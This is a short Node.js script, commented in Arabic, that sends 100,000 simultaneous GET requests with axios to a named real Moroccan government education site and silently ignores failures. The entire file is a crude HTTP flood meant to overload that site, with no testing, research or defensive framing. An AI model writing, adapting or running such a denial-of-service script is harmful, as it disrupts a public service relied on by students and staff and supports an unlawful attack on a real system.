const axios = require('axios');

async function sendRequests() {
  const url = 'https://massar.men.gov.ma'; // تم تغيير الرابط هنا
  const requestsCount = 100000;
  const requests = [];

  console.log('بدء إرسال الطلبات...');

  for (let i = 0; i < requestsCount; i++) {
    requests.push(axios.get(url).catch(error => {}));
  }

  try {
    await Promise.all(requests);
    console.log('تم إرسال جميع الطلبات بنجاح.');
  } catch (error) {
    console.error('حدث خطأ أثناء إرسال الطلبات:', error);
  }
}

sendRequests();
